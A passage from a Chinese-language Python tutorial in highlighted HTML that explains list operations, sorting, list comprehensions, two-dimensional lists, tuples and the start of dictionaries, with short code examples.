class="hljs-number">50</span>]<br><br><span class="hljs-keyword">for</span> index, element <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(my_list):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Index:&quot;</span>, index, <span class="hljs-string">&quot;Element:&quot;</span>, element)<br></code></pre></td></tr></table></figure><h2 id="添加删除和修改列表元素">2.4 添加、删除和修改列表元素</h2><h3 id="添加元素">2.4.1 添加元素</h3><ol type="1"><li><strong>使用 <code>append()</code> 方法：</strong>将元素添加到列表的末尾。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>my_list.append(<span class="hljs-number">4</span>)<br><span class="hljs-comment"># 现在 my_list 是 [1, 2, 3, 4]</span><br></code></pre></td></tr></table></figure><ol start="2" type="1"><li><strong>使用 <code>insert()</code> 方法：</strong>在指定的位置插入元素。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>my_list.insert(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>)  <span class="hljs-comment"># 在索引为 1 的位置插入元素 5</span><br><span class="hljs-comment"># 现在 my_list 是 [1, 5, 2, 3]</span><br></code></pre></td></tr></table></figure><h3 id="删除元素">2.4.2 删除元素</h3><ol type="1"><li><strong>使用 <code>remove()</code> 方法：</strong>删除列表中第一个匹配的元素。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>]<br>my_list.remove(<span class="hljs-number">2</span>)<br><span class="hljs-comment"># 现在 my_list 是 [1, 3, 2]，注意只移除了第一个匹配的元素</span><br></code></pre></td></tr></table></figure><ol start="2" type="1"><li><strong>使用 <code>pop()</code> 方法：</strong>删除指定索引位置的元素并返回它。如果不指定索引，默认删除最后一个元素。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>popped_element = my_list.pop(<span class="hljs-number">1</span>)  <span class="hljs-comment"># 删除索引为 1 的元素并返回它</span><br><span class="hljs-comment"># 现在 my_list 是 [1, 3]，popped_element 是 2</span><br></code></pre></td></tr></table></figure><ol start="3" type="1"><li><strong>使用 <code>del</code> 关键字：</strong>删除指定索引位置的元素或删除整个切片。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<br><span class="hljs-keyword">del</span> my_list[<span class="hljs-number">2</span>]  <span class="hljs-comment"># 删除索引为 2 的元素</span><br><span class="hljs-comment"># 现在 my_list 是 [1, 2, 4, 5]</span><br><br><span class="hljs-keyword">del</span> my_list[<span class="hljs-number">1</span>:<span class="hljs-number">3</span>]  <span class="hljs-comment"># 删除索引为 1 到 2 的元素</span><br><span class="hljs-comment"># 现在 my_list 是 [1, 5]</span><br></code></pre></td></tr></table></figure><h3 id="修改元素">2.4.3 修改元素</h3><ol type="1"><li><strong>通过索引赋值：</strong>直接使用索引来修改列表中的元素。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>my_list[<span class="hljs-number">1</span>] = <span class="hljs-number">5</span><br><span class="hljs-comment"># 现在 my_list 是 [1, 5, 3]</span><br></code></pre></td></tr></table></figure><h2 id="对列表进行统计计算">2.5 对列表进行统计计算</h2><p>在 Python中，你可以对列表进行各种统计计算，比如求和、找到最大值、最小值、平均值等。这些操作可以通过内置的列表方法或者使用一些内置函数来完成。</p><ol type="1"><li><strong>求和：</strong> 使用 <code>sum()</code>函数计算列表中所有元素的和。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<br>total = <span class="hljs-built_in">sum</span>(my_list)  <span class="hljs-comment"># 求和</span><br><span class="hljs-comment"># total = 15</span><br></code></pre></td></tr></table></figure><ol start="2" type="1"><li><strong>找到最大值和最小值：</strong> 使用 <code>max()</code> 和<code>min()</code> 函数分别找到列表中的最大值和最小值。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<br>max_value = <span class="hljs-built_in">max</span>(my_list)  <span class="hljs-comment"># 最大值</span><br><span class="hljs-comment"># max_value = 5</span><br><br>min_value = <span class="hljs-built_in">min</span>(my_list)  <span class="hljs-comment"># 最小值</span><br><span class="hljs-comment"># min_value = 1</span><br></code></pre></td></tr></table></figure><ol start="3" type="1"><li><strong>计算平均值：</strong> 通过求和和列表长度来计算平均值。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<br>average = <span class="hljs-built_in">sum</span>(my_list) / <span class="hljs-built_in">len</span>(my_list)  <span class="hljs-comment"># 平均值</span><br><span class="hljs-comment"># average = 3.0</span><br></code></pre></td></tr></table></figure><ol start="4" type="1"><li><strong>使用统计模块：</strong> Python 的 <code>statistics</code>模块提供了更多的统计函数，可以处理均值、中位数、方差等。</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> statistics<br><br>my_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<br>mean = statistics.mean(my_list)  <span class="hljs-comment"># 均值</span><br><span class="hljs-comment"># mean = 3.0</span><br><br>median = statistics.median(my_list)  <span class="hljs-comment"># 中位数</span><br><span class="hljs-comment"># median = 3</span><br><br>variance = statistics.variance(my_list)  <span class="hljs-comment"># 方差</span><br><span class="hljs-comment"># variance = 2.5</span><br></code></pre></td></tr></table></figure><h2 id="对列表进行排序">2.6 对列表进行排序</h2><p>在 Python中，对列表进行排序有多种方法，可以根据需要进行升序或降序排序。</p><h3 id="sort-方法">2.6.1 <code>sort()</code> 方法</h3><ol type="1"><li><strong>升序排序：</strong></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9</span>]<br>my_list.sort()  <span class="hljs-comment"># 默认升序排序</span><br><span class="hljs-comment"># 现在 my_list 是 [1, 2, 4, 7, 9]</span><br></code></pre></td></tr></table></figure><ol start="2" type="1"><li><strong>降序排序：</strong></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9</span>]<br>my_list.sort(reverse=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 降序排序</span><br><span class="hljs-comment"># 现在 my_list 是 [9, 7, 4, 2, 1]</span><br></code></pre></td></tr></table></figure><h3 id="sorted-函数">2.6.2 <code>sorted()</code> 函数</h3><p>如果你不想修改原始列表，可以使用 <code>sorted()</code>函数创建一个新的排序后的列表。</p><ol type="1"><li><strong>升序排序：</strong></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9</span>]<br>sorted_list = <span class="hljs-built_in">sorted</span>(my_list)  <span class="hljs-comment"># 默认升序排序</span><br><span class="hljs-comment"># sorted_list 是 [1, 2, 4, 7, 9]</span><br><span class="hljs-comment"># my_list 仍然是 [4, 2, 7, 1, 9]</span><br></code></pre></td></tr></table></figure><ol start="2" type="1"><li><strong>降序排序：</strong></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-number">4</span>, <span class="hljs-number">2</span>, <span class="hljs-number">7</span>, <span class="hljs-number">1</span>, <span class="hljs-number">9</span>]<br>sorted_list = <span class="hljs-built_in">sorted</span>(my_list, reverse=<span class="hljs-literal">True</span>)  <span class="hljs-comment"># 降序排序</span><br><span class="hljs-comment"># sorted_list 是 [9, 7, 4, 2, 1]</span><br><span class="hljs-comment"># my_list 仍然是 [4, 2, 7, 1, 9]</span><br></code></pre></td></tr></table></figure><h3 id="自定义排序规则">2.6.3 自定义排序规则</h3><p>你也可以使用 <code>sort()</code> 方法或 <code>sorted()</code> 函数的<code>key</code> 参数来指定自定义排序规则。例如，按元素长度排序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">my_list = [<span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-string">&quot;orange&quot;</span>, <span class="hljs-string">&quot;banana&quot;</span>, <span class="hljs-string">&quot;kiwi&quot;</span>]<br>my_list.sort(key=<span class="hljs-built_in">len</span>)  <span class="hljs-comment"># 按元素长度升序排序</span><br><span class="hljs-comment"># 现在 my_list 是 [&quot;kiwi&quot;, &quot;apple&quot;, &quot;orange&quot;, &quot;banana&quot;]</span><br></code></pre></td></tr></table></figure><h2 id="列表推导式">2.7 列表推导式</h2><p>列表推导式是一种简洁且强大的方式，用于根据现有列表创建新的列表。它允许在一行代码中对列表进行转换、过滤和操作。基本的列表推导式结构是在一个方括号内部定义一个表达式，该表达式通常包含一个迭代操作，用来生成新的列表。</p><h3 id="基本语法">2.7.1 基本语法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">new_list = [expression <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> iterable <span class="hljs-keyword">if</span> condition]<br></code></pre></td></tr></table></figure><ul><li><code>expression</code>：对 item 的操作或转换。</li><li><code>item</code>：迭代的元素。</li><li><code>iterable</code>：可迭代对象，比如列表、元组、字符串等。</li><li><code>condition</code>（可选）：对 item 的过滤条件。</li></ul><h3 id="示例">2.7.2 示例</h3><ol type="1"><li><strong>生成一个新列表，包含原列表中每个元素的平方：</strong></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">original_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>]<br>squared_list = [x ** <span class="hljs-number">2</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> original_list]<br><span class="hljs-comment"># squared_list 是 [1, 4, 9, 16, 25]</span><br></code></pre></td></tr></table></figure><ol start="2" type="1"><li><strong>筛选出偶数并生成新列表：</strong></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">numbers = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>]<br>even_numbers = [x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> numbers <span class="hljs-keyword">if</span> x % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>]<br><span class="hljs-comment"># even_numbers 是 [2, 4, 6, 8, 10]</span><br></code></pre></td></tr></table></figure><ol start="3" type="1"><li><strong>使用条件表达式修改元素：</strong></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">mixed_list = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-string">&#x27;a&#x27;</span>, <span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-number">3</span>]<br>modified_list = [x <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(x, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> mixed_list]<br><span class="hljs-comment"># modified_list 是 [1, 2, 0, 0, 3]</span><br><span class="hljs-comment"># 将非整数元素替换为 0</span><br></code></pre></td></tr></table></figure><h2 id="二维列表">2.8 二维列表</h2><p>二维列表是指列表中的元素也是列表，创建起来就像是在列表中嵌套列表一样。这种嵌套的结构允许你在一个列表中存储列表。</p><h3 id="创建二维列表">2.8.1 创建二维列表</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 使用嵌套的方括号创建二维列表</span><br>two_dimensional_list = [<br>    [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>],<br>    [<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>],<br>    [<span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>]<br>]<br><br><span class="hljs-comment"># 另一个例子</span><br>matrix = [<br>    [<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>],<br>    [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>],<br>    [<span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>]<br>]<br></code></pre></td></tr></table></figure><h3 id="访问二维列表元素">2.8.2 访问二维列表元素</h3><p>要访问二维列表中的元素，可以使用双重索引。第一个索引选择嵌套列表的子列表，第二个索引选择子列表中的元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(two_dimensional_list[<span class="hljs-number">0</span>][<span class="hljs-number">0</span>])  <span class="hljs-comment"># 访问第一个子列表的第一个元素，输出：1</span><br><span class="hljs-built_in">print</span>(matrix[<span class="hljs-number">1</span>][<span class="hljs-number">2</span>])  <span class="hljs-comment"># 访问第二个子列表的第三个元素，输出：5</span><br></code></pre></td></tr></table></figure><h3 id="遍历二维列表">2.8.3 遍历二维列表</h3><p>遍历二维列表需要嵌套循环，第一个循环用于迭代外层列表的子列表，第二个循环用于迭代每个子列表中的元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> row <span class="hljs-keyword">in</span> two_dimensional_list:<br>    <span class="hljs-keyword">for</span> element <span class="hljs-keyword">in</span> row:<br>        <span class="hljs-built_in">print</span>(element)<br></code></pre></td></tr></table></figure><h1 id="元组">3. 元组</h1><p>元组（tuple）是 Python中的一种数据结构，类似于列表，但是元组是<strong>不可变</strong>的序列，意味着一旦创建，其内容不可更改。元组使用圆括号() 来表示，其中包含逗号分隔的元素。</p><h2 id="元组的创建和删除">3.1 元组的创建和删除</h2><p>创建元组可以使用圆括号 ()，将元素用逗号分隔即可。如下所示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 创建一个元组</span><br>my_tuple = (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)<br><span class="hljs-built_in">print</span>(my_tuple)  <span class="hljs-comment"># 输出：(1, 2, 3, 4, 5)</span><br></code></pre></td></tr></table></figure><p>如果元组只有一个元素，需要在元素后面加上逗号，否则 Python会将其视为普通的数据类型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 创建只有一个元素的元组</span><br>single_element_tuple = (<span class="hljs-number">10</span>,)  <span class="hljs-comment"># 注意逗号的存在</span><br><span class="hljs-built_in">print</span>(single_element_tuple)  <span class="hljs-comment"># 输出：(10,)</span><br></code></pre></td></tr></table></figure><p>删除元组本身是不允许的，因为元组是不可变的，一旦创建，就无法更改。但是你可以删除整个元组变量：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">my_tuple = (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)<br><span class="hljs-keyword">del</span> my_tuple<br><span class="hljs-comment"># 此后尝试访问 my_tuple 将会引发 NameError 错误，因为元组变量已被删除</span><br></code></pre></td></tr></table></figure><p>但无法像列表一样对元组的元素进行增删改操作。若需要修改元组，你需要重新创建一个新的元组。</p><h2 id="访问元组元素">3.2 访问元组元素</h2><p>要访问元组中的元素，你可以使用索引来获取特定位置的值。在 Python中，索引从 0 开始，负数索引表示从元组末尾开始计数。这是一个示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">my_tuple = (<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>, <span class="hljs-number">50</span>)<br><br><span class="hljs-comment"># 访问单个元素</span><br><span class="hljs-built_in">print</span>(my_tuple[<span class="hljs-number">0</span>])  <span class="hljs-comment"># 输出：10</span><br><span class="hljs-built_in">print</span>(my_tuple[<span class="hljs-number">2</span>])  <span class="hljs-comment"># 输出：30</span><br><br><span class="hljs-comment"># 使用负数索引访问元组元素</span><br><span class="hljs-built_in">print</span>(my_tuple[-<span class="hljs-number">1</span>])  <span class="hljs-comment"># 输出：50（最后一个元素）</span><br><span class="hljs-built_in">print</span>(my_tuple[-<span class="hljs-number">3</span>])  <span class="hljs-comment"># 输出：30（倒数第三个元素）</span><br></code></pre></td></tr></table></figure><p>你还可以使用切片来访问元组的一部分，通过指定起始索引和结束索引（不包括结束索引位置的元素）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">my_tuple = (<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>, <span class="hljs-number">50</span>)<br><br><span class="hljs-comment"># 使用切片获取元组的子集</span><br>subset = my_tuple[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>]<br><span class="hljs-built_in">print</span>(subset)  <span class="hljs-comment"># 输出：(20, 30, 40)</span><br><br><span class="hljs-comment"># 使用步长来获取元组的间隔元素</span><br>subset_with_step = my_tuple[::<span class="hljs-number">2</span>]<br><span class="hljs-built_in">print</span>(subset_with_step)  <span class="hljs-comment"># 输出：(10, 30, 50)</span><br></code></pre></td></tr></table></figure><p>元组是不可变的，因此无法直接对元组的元素进行修改。</p><h2 id="修改元组">3.3 修改元组</h2><p>在Python中，元组是不可变的数据结构，这意味着一旦创建了元组，就无法直接修改其内容。如果你需要对元组中的数据进行更改，你需要重新创建一个新的元组。</p><p>例如，你可以通过拼接原始元组的部分内容和新的元素来创建一个新的元组：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">my_tuple = (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>)<br>new_tuple = my_tuple[:<span class="hljs-number">2</span>] + (<span class="hljs-number">10</span>, <span class="hljs-number">20</span>) + my_tuple[<span class="hljs-number">3</span>:]  <span class="hljs-comment"># 创建一个新元组</span><br><span class="hljs-built_in">print</span>(new_tuple)  <span class="hljs-comment"># 输出：(1, 2, 10, 20, 4, 5)</span><br></code></pre></td></tr></table></figure><p>在上述示例中，<code>new_tuple</code> 是通过将原始元组<code>my_tuple</code>的不可变部分进行切片，并使用新的元素进行连接，最终创建了一个新的元组。</p><p>虽然元组本身不可变，但如果元组中包含可变对象（例如列表），则可以更改可变对象的内容。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">my_tuple = (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>], <span class="hljs-number">5</span>)<br>my_tuple[<span class="hljs-number">2</span>][<span class="hljs-number">0</span>] = <span class="hljs-number">10</span>  <span class="hljs-comment"># 可以更改元组中列表的元素</span><br><span class="hljs-built_in">print</span>(my_tuple)  <span class="hljs-comment"># 输出：(1, 2, [10, 4], 5)</span><br></code></pre></td></tr></table></figure><p>在这个例子中，元组包含一个列表作为其中的一个元素。尽管元组本身不可变，但列表是可变的，因此可以修改列表中的元素。</p><h2 id="元组和列表的区别">3.4 元组和列表的区别</h2><p>在 Python中，元组（tuple）和列表（list）是两种常用的数据结构，它们之间有一些重要的区别：</p><ol type="1"><li><strong>可变性</strong>：<ul><li><strong>元组</strong>是不可变的（immutable）。一旦创建了元组，其内容不能被修改，即元组中的元素不能被增加、删除或修改。</li><li><strong>列表</strong>是可变的（mutable）。列表中的元素可以被修改、添加或删除。</li></ul></li><li><strong>语法表示</strong>：<ul><li><strong>元组</strong>使用圆括号 <code>()</code> 表示，元素之间用逗号<code>,</code> 分隔。例如：<code>(1, 2, 3)</code></li><li><strong>列表</strong>使用方括号 <code>[]</code>表示，元素之间也用逗号 <code>,</code>分隔。例如：<code>[1, 2, 3]</code></li></ul></li><li><strong>性能</strong>：<ul><li>由于元组是不可变的，因此在特定情况下，元组的性能可能会比列表稍微好一些。因为不需要考虑元组是否会被修改，所以在某些场景下，元组的操作会更快。</li></ul></li><li><strong>适用性</strong>：<ul><li><strong>元组</strong>通常用于存储不可变的数据集合，例如表示一组常量值、函数返回多个值时使用元组来打包返回值等。</li><li><strong>列表</strong>用于存储可变的数据集合，可以动态地增加、删除或修改其中的元素。</li></ul></li><li><strong>方法和操作</strong>：<ul><li>由于列表是可变的，它具有更多的内置方法和操作，如<code>append()</code>、<code>insert()</code>、<code>remove()</code>等，用于修改列表的内容。</li><li>元组作为不可变对象，它具有更少的方法和操作。</li></ul></li></ol><p>示例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 元组示例</span><br>tuple_example = (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>)<br><span class="hljs-comment"># 尝试修改元组内容会引发错误</span><br><span class="hljs-comment"># tuple_example[0] = 5  # 会引发 TypeError: &#x27;tuple&#x27; object does not support item assignment</span><br><br><span class="hljs-comment"># 列表示例</span><br>list_example = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]<br>list_example[<span class="hljs-number">0</span>] = <span class="hljs-number">5</span>  <span class="hljs-comment"># 可以修改列表中的元素</span><br><span class="hljs-built_in">print</span>(list_example)  <span class="hljs-comment"># 输出: [5, 2, 3]</span><br></code></pre></td></tr></table></figure><p>总的来说，选择使用元组还是列表取决于你的需求。如果需要一个不可变的数据集合，可以选择使用元组。如果需要一个可以动态修改的数据集合，使用列表会更合适。</p><h1 id="字典">4. 字典</h1><p>Python中的字典（Dictionary）是一种无序、可变、有键的集合类型，用于存储键-值对。字典中的<strong>键</strong>必须是<strong>不可变</strong>的类型（通常是字符串或数字），而<strong>值</strong>可以是<strong>任何数据类型</strong>（包括列表、元组、其他字典等）。字典用大括号<code>&#123;&#125;</code> 表示，键和值之间用冒号 <code>:</code>分隔，各个键值对之间用逗号 <code>,</code> 分隔。</p><p>在 Python 中创建和删除字典可以通过简单的语法来实现。</p><h2 id="字典的创建和删除">4.1 字典的创建和删除</h2><p>使用大括号 <code>&#123;&#125;</code>可以创建一个空字典，也可以在大括号内添加键值对来初始化字典。</p><ol type="1"><li><p>创建空字典： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">empty_dict = &#123;&#125;<br></code></pre></td></tr></table></figure></p></li><li><p>创建带有键值对的字典： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">my_dict = &#123;<span class="hljs-string">&#x27;apple&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;banana&#x27;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;orange&#x27;</span>: <span class="hljs-number">2</span>&#125;<br></code></pre></td></tr></table></figure></p></li></ol><p>可以使用 <code>del</code> 关键字来删除整个字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">my_dict = &#123;<span class="hljs-string">&#x27;apple&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;banana&#x27;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;orange&#x27;</span>: <span class="hljs-number">2</span>&#125;<br><span class="hljs-keyword">del</span> my_dict  <span class="hljs-comment"># 删除整个字典</span><br></code></pre></td></tr></table></figure><p>通过 <code>clear()</code>方法可以清空字典中的所有元素，使其变为空字典：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python">my_dict = &#123;<span class="hljs-string">&#x27;apple&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;banana&#x27;</span>: <span class="hljs-number">5</span>, <span class="hljs-string">&#x27;orange&#x27;</span>: <span class="hljs-number">2</span>&#125;<br><br><span class="hljs-comment"># 清空字典</span><br>my_dict.clear()<br></code></pre></td></tr></table></figure><h2 id="访问字典">4.2 访问字典</h2><p>可以通过指定键来访问字典中的值：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs axapta">pythonCopy codemy_dict = &#123;<span class="hljs-string">&#x27;apple&#x27;</span>: <span class="hljs-number">3</span>, <span class="hljs-string">&#x27;banana&#x27;</span>: <span class="hljs-number">5</span>, <span 